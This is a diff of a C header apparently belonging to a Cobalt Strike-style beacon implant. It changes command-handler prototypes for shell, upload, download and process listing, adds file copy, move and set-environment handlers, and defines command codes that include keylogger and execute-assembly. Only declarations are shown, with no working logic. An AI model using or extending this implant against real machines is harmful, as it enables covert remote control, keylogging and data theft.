@@ -32,15 +32,18 @@ typedef struct {
 }BeaconJob;
 
 VOID CmdChangSleepTimes(unsigned char* commandBuf);
-VOID CmdPs(unsigned char* commandBuf, size_t* commandBuflen);
-VOID CmdBeaconBof(unsigned char* commandBuf, size_t* commandBuflen);
+VOID CmdPs(unsigned char* commandBuf, size_t commandBuflen);
+VOID CmdBeaconBof(unsigned char* commandBuf, size_t commandBuflen);
 unsigned char* CmdFileBrowse(unsigned char* commandBuf, size_t* msgLen);
-unsigned char* CmdUpload(unsigned char* commandBuf, size_t* commandBuflen, size_t* msgLen, int chunkNumber);
+unsigned char* CmdUpload(unsigned char* commandBuf, size_t commandBuflen, size_t* msgLen, DWORD chunkNumber);
 unsigned char* CmdDrives(unsigned char* commandBuf, size_t* msgLen);
-unsigned char* CmdMkdir(unsigned char* commandBuf, size_t* commandBuflen, size_t* msgLen);
-unsigned char* CmdFileRemove(unsigned char* commandBuf, size_t* commandBuflen, size_t* msgLen);
-VOID CmdFileDownload(unsigned char* commandBuf, size_t* commandBuflen, size_t* msgLen);
-VOID CmdShell(unsigned char* commandBuf, size_t* commandBuflen);
+unsigned char* CmdMkdir(unsigned char* commandBuf, size_t commandBuflen, size_t* msgLen);
+unsigned char* CmdFileRemove(unsigned char* commandBuf, size_t commandBuflen, size_t* msgLen);
+unsigned char* CmdFileCopy(unsigned char* commandBuf, size_t commandBuflen, size_t* msgLen);
+unsigned char* CmdFileMove(unsigned char* commandBuf, size_t commandBuflen, size_t* msgLen);
+unsigned char* CmdSetEnv(unsigned char* commandBuf, size_t commandBuflen, size_t* msgLen);
+VOID CmdFileDownload(unsigned char* commandBuf, size_t commandBuflen, size_t* msgLen);
+VOID CmdShell(unsigned char* commandBuf, size_t commandBuflen);
 unsigned char* CmdPwd(unsigned char* commandBuf, size_t* msgLen);
 unsigned char* CmdGetUid(unsigned char* commandBuf, size_t* msgLen);
 wchar_t* makeMetaData();
@@ -116,6 +119,7 @@ void CheckTimeout(HANDLE hNamedPipe, int timeout);
 #define	CMD_TYPE_KEYLOGGER                   101
 #define	CMD_TYPE_EXECUTE_ASSEMBLY_X64        88
 #define	CMD_TYPE_EXECUTE_ASSEMBLY_X86        87
+#define CMD_TYPE_SETENV                      72
 #define	CMD_TYPE_EXECUTE_ASSEMBLY_TOKEN_X64  71
 #define	CMD_TYPE_EXECUTE_ASSEMBLY_TOKEN_X86  70
 #define	CMD_TYPE_IMPORT_POWERSHELL           37
